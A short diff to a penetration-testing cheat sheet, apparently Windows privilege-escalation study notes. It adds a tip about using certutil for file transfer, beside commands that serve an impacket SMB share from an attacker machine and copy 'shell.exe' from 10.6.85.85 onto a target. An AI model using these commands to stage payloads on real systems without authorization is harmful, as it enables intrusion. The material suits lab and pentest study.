@@ -106,7 +106,8 @@ https://github.com/SecWiki/windows-kernel-exploits
 ____   
 
 # File Transfer     
-[Reference - 15 ways to download files](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-download-a-file/) 
+[Reference - 15 ways to download files](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-download-a-file/)   
+**try certutil first - sometimes Powershell has problems, check size of file to see if transfer was successful** 
 
     sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
     copy \\10.6.85.85\kali\shell.exe C:\PrivEsc\shell.exe
